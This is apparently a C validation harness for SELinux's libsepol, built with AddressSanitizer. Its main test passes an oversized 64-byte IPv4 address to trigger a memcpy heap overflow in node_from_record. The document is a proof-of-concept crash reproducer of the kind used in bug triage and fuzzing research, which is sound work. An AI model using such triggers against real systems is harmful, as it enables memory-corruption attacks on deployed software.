/*
 * Unified Validation Harness — SELinux (libsepol + libselinux)
 *
 * Compile:
 *   gcc -fsanitize=address -g -O0 -w \
 *       -I<selinux_src>/libsepol/include -I<selinux_src>/libselinux/include \
 *       -I<selinux_src>/libsepol/cil/include \
 *       harness_selinux.c \
 *       <selinux_src>/libsepol/libsepol.a <selinux_src>/libselinux/libselinux.a \
 *       -lm -lpthread -ldl -lpcre2-8 -o test_harness
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sepol/handle.h>
#include <sepol/policydb.h>
#include <sepol/policydb/policydb.h>
#include <sepol/policydb/hashtab.h>
#include <sepol/node_record.h>
#include <sepol/context_record.h>
#include <sepol/boolean_record.h>

/* ================================================================
 * BASELINE INPUT
 * ================================================================ */

#ifndef TARGET_FUNC
#define TARGET_FUNC  "node_from_record"
#define TARGET_FILE  "nodes.c"
#define TARGET_LINE  39
#endif

#ifndef ENTRY_PATH
#define ENTRY_PATH "node_modify"
/* Options: "node_modify", "context_create", "bool_create",
 *          "hashtab", "policydb_read", "module_to_cil",
 *          "kernel_to_cil", "ebitmap" */
#endif

/* ================================================================
 * Entry path implementations
 * ================================================================ */

static int test_node_modify(void) {
    sepol_handle_t *handle = sepol_handle_create();
    if (!handle) return 1;

    sepol_policydb_t *policydb = NULL;
    sepol_policydb_create(&policydb);
    if (!policydb) { free(handle); return 1; }

    sepol_node_t *node = NULL;
    sepol_node_create(handle, &node);
    if (!node) {
        sepol_policydb_free(policydb);
        sepol_handle_destroy(handle);
        return 1;
    }

    /* Set protocol to IPv4 */
    sepol_node_set_proto(node, SEPOL_PROTO_IP4);

    /* Set addr_bytes larger than IPv4's 4 bytes → overflow in node_from_record */
    unsigned char big_addr[64];
    memset(big_addr, 'A', sizeof(big_addr));
    sepol_node_set_addr_bytes(handle, node, big_addr, sizeof(big_addr));

    unsigned char mask[4] = {0xff, 0xff, 0xff, 0x00};
    sepol_node_set_mask_bytes(handle, node, mask, sizeof(mask));

    /* Set context */
    sepol_context_t *ctx = NULL;
    sepol_context_create(handle, &ctx);
    if (ctx) {
        sepol_context_set_user(handle, ctx, "system_u");
        sepol_context_set_role(handle, ctx, "object_r");
        sepol_context_set_type(handle, ctx, "default_t");
        sepol_node_set_con(handle, node, ctx);
        sepol_context_free(ctx);
    }

    /* This calls node_from_record → memcpy overflow */
    sepol_node_modify(handle, policydb, NULL, node);

    sepol_node_free(node);
    sepol_policydb_free(policydb);
    sepol_handle_destroy(handle);
    return 0;
}

static int test_hashtab(void) {
    hashtab_t h = hashtab_create(NULL, NULL, 4);
    if (!h) return 1;

    /* Insert with controlled hash collision */
    char *key1 = strdup("key1");
    char *key2 = strdup("key2");
    hashtab_insert(h, key1, (void *)1);
    hashtab_insert(h, key2, (void *)2);

    hashtab_destroy(h);
    return 0;
}

static int test_context_create(void) {
    sepol_handle_t *handle = sepol_handle_create();
    if (!handle) return 1;

    sepol_context_t *ctx = NULL;
    sepol_context_create(handle, &ctx);
    if (!ctx) {
        sepol_handle_destroy(handle);
        return 1;
    }

    sepol_context_set_user(handle, ctx, "system_u");
    sepol_context_set_role(handle, ctx, "object_r");
    sepol_context_set_type(handle, ctx, "default_t");

    char *str = NULL;
    sepol_context_to_string(handle, ctx, &str);
    if (str) free(str);

    sepol_context_free(ctx);
    sepol_handle_destroy(handle);
    return 0;
}

/* ================================================================
 * Main
 * ================================================================ */

int main(void) {
    fprintf(stderr, "Target: %s at %s:%d\n", TARGET_FUNC, TARGET_FILE, TARGET_LINE);
    fprintf(stderr, "Entry path: %s\n", ENTRY_PATH);

    if (strcmp(ENTRY_PATH, "node_modify") == 0) return test_node_modify();
    if (strcmp(ENTRY_PATH, "hashtab") == 0) return test_hashtab();
    if (strcmp(ENTRY_PATH, "context_create") == 0) return test_context_create();

    fprintf(stderr, "Unknown entry path: %s\n", ENTRY_PATH);
    return 1;
}
